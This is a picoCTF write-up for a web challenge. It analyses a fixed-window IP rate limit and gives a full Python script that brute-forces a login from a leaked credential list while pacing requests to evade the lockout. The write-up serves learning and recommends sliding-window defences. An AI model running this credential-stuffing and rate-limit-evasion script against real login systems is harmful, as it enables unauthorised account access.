---
title: Fool the Lockout
date: 2026-10-26
platform: picoCTF
category: Web
difficulty: Medium
tags:
  - ratelimiting
  - bruteforce
---
# Fool the Lockout

> **Category:** Web | **difficulty** : Medium | **platform** : PicoCTF

**Problem:** The challenge is a login web page with faulty rate-limiting logic. We're given a leaked `username;password` list and expected to brute-force the login while bypassing the rate limit.

**Solution in one line:** Stay just under the server's max-requests-per-epoch threshold by pacing requests evenly within each window, so the lockout condition is never triggered.

**Concepts:** `rate-limit bypassing` `brute-forcing` `python scripting`

---

## The vulnerability / concept

**Problem Statement**

The Problem is described as such:

"Your friend is building a simple website with a login page.

To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.

To test their defense, they’ve:
- Created a dummy account with a random username–password pair from public credential lists.
- Given you those username and password lists.
- Shared the full source code."

So the objective is to look at the source code provided in a zip file and find the flaw in the code-base. We're also given a credential list and told that rate-limiting is implemented, so the expectation is to brute-force the login endpoint without ever triggering the lockout.

The code-base has flawed rate-limiting logic: it allows up to a set maximum number of requests within a fixed epoch (time window). Going over that limit within the window results in an IP lockout.

**Flaws:**
- The password list is small enough that it can be exhausted well within the allowed request budget.
- The back-end's failed-attempt threshold is generous enough to leave a comfortable margin for iteration before a lockout is ever risked.
- It uses fixed-window rate-limiting instead of a sliding window or persistent, continuously-tracked counter.

**Where it shows up in real life:**
This type of flaw frequently shows up when developers roll their own rate-limiting logic instead of relying on industry-standard implementations like those built into Nginx, AWS WAF, or Cloudflare. A fixed-window scheme lets an attacker send a burst of requests right before a window closes and another burst right after it reopens — effectively doubling the allowed request rate in a very small span of time.

---

## Walkthrough
First of all Download the provided files, `app.py` and `creds-dump.txt`. `creds-dump.txt` holds username;password pairs, so it needs to be parsed before use.

In `app.py`, three variables immediately stand out as the core of the rate-limiting logic:

```
MAX_REQUESTS = 10      # max failed attempts before a user is locked out
EPOCH_DURATION = 30     # timeframe for failed attempts (in seconds)
LOCKOUT_DURATION = 120      # duration a user will be locked out for (in seconds)
```

To understand the problem fully, we look at the rest of the code. Most of it is helper functions and utilities, with a few acting as the interface to the login route. Here, `request_rates` is a JSON object that tracks requests per sender IP. Two functions stand out as the actual rate-limiting logic: `refresh_request_rates_db` and `exceeded_rate_limit`.

Now unto a bit of a theory part, `refresh_request_rates_db` function refreshes the database before and after a request is counted. If an IP in `request_rates` is currently locked out and the lockout period has elapsed, it resets the counter.
``` py
if curr_time - epoch_start_time > EPOCH_DURATION:
        request_rates[client_ip]["num_requests"] = 0
```
It also resets the counter once the epoch window has rolled over.

```py
if (lockout_end != -1) and time.time() >= lockout_end:
        request_rates[client_ip]["lockout_until"] = -1

```

Function `refresh_request_rates_db` is called inside `exceeded_rate_limit` function to update the record for the requesting IP. If the IP isn't yet in `request_rates`, it's added with a request counter of 0. Each new request from that IP increments the counter as `request_rates[client_ip]['num_requests'] += 1`, and once the counter hits the limit, it triggers a lockout for `LOCKOUT_DURATION`, i.e. `request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION`. 

## Solution
With the logic mapped out, the objective becomes writing a script that brute-forces the login while staying under this rate limit.
We start by loading and parsing the credential file:

```py
def load_credentials(path):
    creds = []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or ";" not in line:
                continue
            user, pwd = line.split(";", 1)
            creds.append((user.strip(), pwd.strip()))
    return creds
```

Complete script for the solution is posted below this section. The script works through the leaked credential list one pair at a time, but it paces itself so it never crosses the server's 10-requests-per-30-second threshold. It picks a safe budget of 9 requests per epoch and spreads them evenly across the 30 seconds (`spacing = EPOCH_DURATION / MAX_REQUESTS`), instead of firing them all at once. Before every attempt it checks whether it's still inside an active lockout or whether the current epoch has expired, and resets its internal counters accordingly, mirroring the same window logic the server itself uses. 

After each login attempt, `classify()` reads the response and sorts it into one of a few buckets — rate-limited, invalid credentials, a successful redirect, or something unexpected, so the script knows whether to back off, keep going, or stop. If the server does rate-limit it anyway, the script simply sleeps until the lockout ends and resumes from where it left off, rather than crashing or hammering the server further.

After the brute-force completes or the 'Success' indication is printed in the console, we get the username and password, using which we can login to get the flag.

---

## Code
```py
#!/usr/bin/env python3
"""Rate-limit-aware login brute-forcer. Spaces requests evenly, idles out lockouts."""
import time
import requests

TARGET_URL = "http://xebec.cylabacademy.net:22455/login"
CREDS_FILE = "creds-dump.txt"
MAX_REQUESTS = 9          # server allows 10; stay under
EPOCH_DURATION = 30       # server epoch window
LOCKOUT_DURATION = 120
FOLLOW_REDIRECTS = True

SESSION = requests.Session()


def load_credentials(path):
    creds = []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or ";" not in line:
                continue
            user, pwd = line.split(";", 1)
            creds.append((user.strip(), pwd.strip()))
    return creds


def classify(resp):
    text = resp.text or ""
    if "Rate Limited Exceeded" in text:
        return "RATE_LIMITED"
    if "Invalid username or password" in text:
        return "INVALID"
    if resp.status_code in (301, 302, 303, 307, 308):
        return "SUCCESS_REDIRECT"
    if "flag" in text.lower():
        return "SUCCESS_INDEX"
    return f"UNKNOWN(status={resp.status_code})"


def main():
    creds = load_credentials(CREDS_FILE)
    print(f"Loaded {len(creds)} creds | MAX_REQUESTS={MAX_REQUESTS} "
          f"EPOCH={EPOCH_DURATION}s LOCKOUT={LOCKOUT_DURATION}s")

    spacing = EPOCH_DURATION / MAX_REQUESTS
    lockout_until = 0.0
    requests_this_epoch = 0
    epoch_start = None

    for username, password in creds:
        now = time.time()

        if now < lockout_until:  # wait out an active lockout
            wait = lockout_until - now
            print(f"[LOCKOUT] Sleeping {wait:.1f}s")
            time.sleep(wait)
            requests_this_epoch = 0
            epoch_start = None
            lockout_until = 0.0

        if epoch_start is not None and (time.time() - epoch_start) >= EPOCH_DURATION:
            requests_this_epoch = 0
            epoch_start = None

        if epoch_start is None:
            epoch_start = time.time()
            requests_this_epoch = 0

        if requests_this_epoch > 0:  # keep requests evenly spaced within the epoch
            delay = (epoch_start + requests_this_epoch * spacing) - time.time()
            if delay > 0:
                time.sleep(delay)

        print(f"[{requests_this_epoch + 1}/{MAX_REQUESTS}] Trying '{username}:{password}' ...", flush=True)
        try:
            resp = SESSION.post(
                TARGET_URL,
                data={"username": username, "password": password},
                allow_redirects=FOLLOW_REDIRECTS,
                timeout=15,
            )
        except requests.RequestException as e:
            print(f"[ERROR] {e}")
            requests_this_epoch += 1
            continue

        result = classify(resp)
        if result == "RATE_LIMITED":
            print(f"[RATE LIMITED] Locking out for {LOCKOUT_DURATION}s")
            lockout_until = time.time() + LOCKOUT_DURATION
        elif result == "INVALID":
            print("[FAIL] Invalid credentials")
        elif result in ("SUCCESS_REDIRECT", "SUCCESS_INDEX"):
            print(f"[SUCCESS] Logged in as '{username}'!")
        else:
            print(f"[{result}] Unexpected response")

        requests_this_epoch += 1

    print("Done.")


if __name__ == "__main__":
    main()

```

---
Unlike usual CTFs, just remaining under the rate limit for solving the problem was enough because the password list was small, and the rate-limit allowed much generous rate of request. There could definitely be some clever edge cases for this problem, which would work for more realistic situations involving longer list of credential and stricter rate-limiting. 
I personally took this CTF as topic to learn the code base and write scripts accordingly rather than using the edge-cases to break past the authentication. Using Sliding window or modified sliding window or persistent counter would make the solution more complicated.